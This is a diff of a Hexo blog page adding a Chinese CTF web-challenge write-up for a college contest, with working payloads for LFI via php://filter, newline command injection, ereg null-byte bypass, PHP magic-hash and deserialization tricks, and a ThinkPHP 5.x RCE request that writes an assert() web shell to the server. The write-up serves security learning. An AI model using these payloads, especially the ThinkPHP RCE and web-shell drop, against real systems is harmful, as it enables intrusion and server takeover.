@@ -146,6 +146,212 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-XCITC 许昌职业技术学院ctf-web-wp" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/07/XCITC 许昌职业技术学院ctf-web-wp/">XCITC ctf web wp</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/07/XCITC 许昌职业技术学院ctf-web-wp/" class="archive-article-date">
+  	<time datetime="2020-04-07T13:41:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-07</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[TOC]</p>
+<h2><span id="1-hellowworld">1. HellowWorld</span></h2><p><img src="https://i.loli.net/2020/04/07/BlfCrmEYueawvF7.png" alt="1.png"></p>
+<hr>
+<h2><span id="2-lfi">2.  LFI</span></h2><p><img src="https://i.loli.net/2020/04/07/8KGHBpoOmA3kCcs.png" alt="31.png"></p>
+<blockquote>
+<p>payload: ?file=php://filter/read=convert.base64-encode/resource=../admin/shell/flag.php</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/04/07/SkYFcE5G9bJNvoz.png" alt="3.png"></p>
+<hr>
+<h2><span id="3-web3">3.  web3</span></h2><p><img src="https://i.loli.net/2020/04/07/DnK7ut62JGPUOBL.png" alt="{R0}OE~BA1TMV3TPZ})9~7U.png"><br><img src="https://i.loli.net/2020/04/07/woUagip2HEZrC9v.png" alt=""></p>
+<hr>
+<h2><span id="4-web2">4. web2</span></h2><p>题目<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">"=pzPgctLXtzP7bNsXxyPRcNEXHyPUcNLXZzP4bNAXHzP2btLXHzPacjLXxwPlbtBXDzP3bDAXpwPkbNAXHzP4bjZXDwP4bjMXVzPkbDMXLwPlbDZXDwPkbts"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>加密是先逆序，再逐个取字符，ascii码+1，拼接。<br>解密就将顺序反过来，且ascii码+1变成-1。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str_rot13() 函数对字符串执行 ROT13 编码。</span><br><span class="line"></span><br><span class="line">ROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。</span><br><span class="line"></span><br><span class="line">str_rot13()后再一次str_rot13() 即还原。</span><br></pre></td></tr></table></figure></p>
+<p>payload<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">"=pzPgctLXtzP7bNsXxyPRcNEXHyPUcNLXZzP4bNAXHzP2btLXHzPacjLXxwPlbtBXDzP3bDAXpwPkbNAXHzP4bjZXDwP4bjMXVzPkbDMXLwPlbDZXDwPkbts"</span>;</span><br><span class="line">$_=<span class="string">""</span>;</span><br><span class="line">$_o=base64_decode(strrev(str_rot13($miwen)));</span><br><span class="line"><span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)<span class="number">-1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> strrev($_);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<hr>
+<h2><span id="5-飞机头等舱">5. 飞机头等舱</span></h2><p><img src="https://i.loli.net/2020/04/11/aTjmIFZxD9vOYG1.png" alt="1.png"></p>
+<p>抓个包看看</p>
+<p><img src="https://i.loli.net/2020/04/11/EsOR6C8no4zBkqm.png" alt="2.png"></p>
+<p><img src="https://i.loli.net/2020/04/11/1LR37EaDbFxdnqo.png" alt="3.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http Authorization:  </span><br><span class="line"></span><br><span class="line">将用户名和密码拼接为 admin:pass 形式的字符串。</span><br><span class="line">用BASE64编码后，放在Authorization header中发送给服务器认证。</span><br><span class="line">服务器端进行基本认证，如果认证通过，则返回正确的页面。否则返回401 unauthorized。</span><br></pre></td></tr></table></figure>
+<p>用python写个脚本 拼接常用的用户名和密码<br><img src="https://i.loli.net/2020/04/11/zXOCANgldS5KTQr.jpg" alt="4.jpg"></p>
+<p>用bp爆破<br><img src="https://i.loli.net/2020/04/11/IG8wfYWjeiH6JFo.jpg" alt="5.jpg"></p>
+<p>换了两三个字典爆破都没爆破出来，可能答案不在这些密码字典里。这题就做到这，知道咋做，字典里没有也没办法。<br><img src="https://i.loli.net/2020/04/11/3QS8oRVY2TGWXCK.jpg" alt="7.jpg"></p>
+<hr>
+<h2><span id="6-域名查询">6 域名查询</span></h2><p>题目<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'ip'</span>])) &#123;</span><br><span class="line">    $target = trim($_REQUEST[<span class="string">'ip'</span>]);</span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;'</span> =&gt;<span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span> =&gt;<span class="string">''</span>,</span><br><span class="line">        <span class="string">'|'</span> =&gt;<span class="string">''</span>,</span><br><span class="line">        <span class="string">'-'</span> =&gt;<span class="string">''</span>,</span><br><span class="line">        <span class="string">'$'</span> =&gt;<span class="string">''</span>,</span><br><span class="line">        <span class="string">'('</span> =&gt;<span class="string">''</span>,</span><br><span class="line">        <span class="string">')'</span> =&gt;<span class="string">''</span>,</span><br><span class="line">        <span class="string">"'"</span> =&gt;<span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line">    $target = str_replace( array_keys ( $substitutions ),$substitutions,$target);</span><br><span class="line">    $cmd = shell_exec(<span class="string">'nslookup'</span> . $target);</span><br><span class="line">            <span class="keyword">echo</span> $target;</span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>过滤得挺全的，可以用%0a绕过。<br><img src="https://i.loli.net/2020/04/11/blgP4rHWiok3UaV.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/04/11/MRXmOiHrjpV2YgP.jpg" alt="1.jpg"></p>
+<p><img src="https://i.loli.net/2020/04/11/f4XGxm6StcCJepB.jpg" alt="2.jpg"></p>
+<hr>
+<h2><span id="7-绕">7.  绕</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"login"</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'xactf'</span>]))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (ereg(<span class="string">"^[a-zA-Z0-9]+$"</span>, $_POST[<span class="string">'xactf'</span>]) === <span class="keyword">FALSE</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("give you flag)")&lt;/script&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (strlen($_POST[<span class="string">'xactf'</span>]) &lt; <span class="number">10</span> &amp;&amp; $_POST[<span class="string">'xactf'</span>] &gt; <span class="number">987654321</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (strpos($_POST[<span class="string">'xactf'</span>], <span class="string">'#BIG#'</span>) !== <span class="keyword">FALSE</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($_POST[<span class="string">'xactf'</span>])) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Congratulations! FLAG is : "</span>.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("wtf")&lt;/script&gt;'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("wtf")&lt;/script&gt;'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">exit</span>(<span class="string">'&lt;script&gt;alert("wtf")&lt;/script&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>ereg() 可用%00截断绕过  后面再加上#BIG#完成匹配</p>
+<figure class="highlight plain"><figcaption><span>< 10 && $_POST['xactf'] > 987654321```可用科学记数法</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">```php</span><br><span class="line">login=1&amp;xactf=1e9%00#BIG#</span><br></pre></td></tr></table></figure>
+<p>要用bp抓包改，直接用浏览器插件post会导致%被编码导致失败。</p>
+<p><img src="https://i.loli.net/2020/04/11/rsqfIxFUk3VyeZS.png" alt="image.png"></p>
+<hr>
+<h2><span id="9">9.</span></h2><p>题目<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"./flag.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_GET[<span class="string">'b'</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $a = <span class="string">'welcome'</span>;</span><br><span class="line">    $b = $_GET[<span class="string">'b'</span>];</span><br><span class="line">    @parse_str($b);</span><br><span class="line">    <span class="keyword">if</span> ($a[<span class="number">0</span>] != <span class="string">'240610708'</span> &amp;&amp; md5($a[<span class="number">0</span>]) == md5(<span class="string">'240610708'</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'NO NO NO'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>parse_str() 变量覆盖<br>?b=a[0]</p>
+<p>md5(‘240610708’)：0e462097431906509019562988736854  </p>
+<p>md5(‘QNKCDZO’)：0e830400451993494058024219903391</p>
+<p>都是数字字符串，都是0e开头，php使用==比较将字符串转化为数字，即0==0； </p>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">![image.png](https://i.loli.net/2020/04/11/lgjqx2eRyNbUYdO.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 10. Dejavu</span><br><span class="line"></span><br><span class="line">php反序列化</span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">class create&#123;</span><br><span class="line">    var $name=&apos;ctfer&apos;;</span><br><span class="line">    var $age;</span><br><span class="line">    var $flag;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $user-&gt;name=$this-&gt;name;</span><br><span class="line">        $user-&gt;age=$this-&gt;age;</span><br><span class="line">        $user-&gt;flag=$this-&gt;flag;</span><br><span class="line">        $this-&gt;drive();</span><br><span class="line">        $this-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getflag()&#123;</span><br><span class="line">        if ($this-&gt;flag==&apos;xcitc&apos;) &#123;</span><br><span class="line">            include_once &quot;./f1ag.php&quot;;</span><br><span class="line">            var_dump($f1ag);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            echo &apos;Your car turned over.&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function drive()&#123;</span><br><span class="line">        if ($this-&gt;age&lt;18) &#123;</span><br><span class="line">            exit(&quot;FBI warning!!&quot;.&quot;&lt;br&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$arg=$_GET[&apos;arg&apos;];</span><br><span class="line">if (strlen($arg)&lt;60) &#123;</span><br><span class="line">    unserialize($arg);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;???&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>要求反序列化后的长度小于60 且 age不小于18 flag==’xcitc’<br>正常反序列化后</p>
+<blockquote>
+<p>O:6:”create”:3:{s:4:”name”;N;s:3:”age”;i:18;s:4:”flag”;s:5:”xcitc”;}</p>
+</blockquote>
+<p>长度大于60了</p>
+<p>因为对name不做要求，所以去掉name。只让age=18，flag=’xcitc’。<br>构造payload：</p>
+<blockquote>
+<p>O:6:”create”:2:{s:3:”age”;i:18;s:4:”flag”;s:5:”xcitc”;}</p>
+</blockquote>
+<p><img src="https://i.loli.net/2020/04/11/vwrC4JKxqsGnXVU.png" alt=""></p>
+<hr>
+<h2><span id="11-thinkphp5-rce">11. :) ThinkPHP5 RCE</span></h2><p>题目 看到ThinkPHP 猜想ThinkPHP 5.x远程RCE<br><img src="https://i.loli.net/2020/04/12/kzDrR7SIuj8AbEo.png" alt="image.png"></p>
+<p>先扫了一下，发现Shell.php<br><img src="https://i.loli.net/2020/04/12/WzGN2VRCkjUO4bI.png" alt="image.png"><br>直接连连不上。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls -al</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo -n YWFhPD9waHAgQGFzc2VydCgkX1BPU1RbJ3hzcyddKTs/PmJiYg== | base64 -d &gt; shell2.php</span><br></pre></td></tr></table></figure>
+<p>蚁剑连上，flag在根目录下。</p>
+<hr>
+<h2><span id="12-getssh">12. GetSSH</span></h2><p>sqlmap失败<br>宽字节注入失败 </p>
+<p>扫了一下有个/source<br>获得ssh password：2d252a262f2b302c31322e2b332e3331</p>
+<p>没做出来</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/07/XCITC 许昌职业技术学院ctf-web-wp/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-信息搜集" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/07/信息搜集/">信息搜集</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/07/信息搜集/" class="archive-article-date">
+  	<time datetime="2020-04-07T08:52:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-07</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">渗透</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/07/信息搜集/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-XCTF-lottery-WriteUpup-git源码泄露-php弱类型比较" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
@@ -231,7 +437,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/06/ssrf-url解析器/">hackgame2019 url解析器 ssrf</a>
+      <a class="article-title" href="/2019/11/06/ssrf-url解析器/">SSRF绕过技巧</a>
     </h1>
   
 
@@ -245,6 +451,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p>python各个不同的库 分别请求的域名<br><img src="https://p4.ssl.qhimg.com/t0140b50133fc83aae3.png" alt=""></p>
+<p><a href="https://www.secpulse.com/archives/65832.html" target="_blank" rel="noopener">1. ssrf绕过方法总结</a></p>
 
       
 
@@ -257,10 +464,6 @@
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">ssrf</a>
         		</li>
@@ -694,80 +897,6 @@
 
 
   
-    <article id="post-ByPassWAF思路" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/08/08/ByPassWAF思路/">ByPassWAF思路</a>
-    </h1>
-  
-
-        
-        <a href="/2019/08/08/ByPassWAF思路/" class="archive-article-date">
-  	<time datetime="2019-08-08T03:15:32.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="https://www.secpulse.com/archives/109577.html" target="_blank" rel="noopener">【思路/技术】某大佬的BypassWAF新思路</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">bypass</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/08/08/ByPassWAF思路/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-2019安全态势" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
   <div class="article-inner">
     
@@ -918,80 +1047,9 @@
 
 
   
-    <article id="post-hello-world" class="article article-type-post  article-index" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/02/09/hello-world/">Hello World</a>
-    </h1>
-  
-
-        
-        <a href="/2019/02/09/hello-world/" class="archive-article-date">
-  	<time datetime="2019-02-09T06:46:31.031Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2><span id="quick-start">Quick Start</span></h2><h3><span id="create-a-new-post">Create a new post</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3><span id="run-server">Run server</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3><span id="generate-static-files">Generate static files</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3><span id="deploy-to-remote-sites">Deploy to remote sites</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/02/09/hello-world/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
